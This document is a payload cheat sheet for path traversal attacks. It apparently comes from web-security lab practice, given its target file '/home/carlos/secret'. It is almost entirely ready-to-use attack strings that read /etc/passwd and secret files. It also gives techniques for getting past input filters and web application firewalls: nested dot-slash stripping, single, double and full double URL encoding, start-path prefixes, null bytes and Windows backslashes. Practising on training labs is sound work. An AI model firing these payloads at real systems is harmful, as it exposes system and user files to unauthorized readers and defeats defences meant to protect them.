# Path Traversal Payloads

## Basic Payloads

### Linux/Unix
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
```

### Target File
```
../../../home/carlos/secret
../../../../home/carlos/secret
../../../../../home/carlos/secret
```

## Absolute Path
```
/etc/passwd
/home/carlos/secret
```

## Bypass Techniques

### Non-Recursive Stripping
```
....//....//....//etc/passwd
....//....//....//home/carlos/secret
```

### URL Encoding
```
..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2fhome%2fcarlos%2fsecret
```

### Double URL Encoding
```
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252fhome%252fcarlos%252fsecret   (in case of waf blocking, encode chars too)
```

### Full Path Encoding (WAF Bypass)
```
%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```

### Start Path Validation
```
/var/www/images/../../../etc/passwd
/var/www/images/../../../home/carlos/secret
```

### Null Byte (Old Systems)
```
../../../etc/passwd%00.png
../../../home/carlos/secret%00.png
```

### Windows Backslash
```
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\home\carlos\secret
```

## Quick Reference

**If basic traversal works but /home/carlos/secret is blocked:**
Use full path URL encoding (double-encoded entire payload)
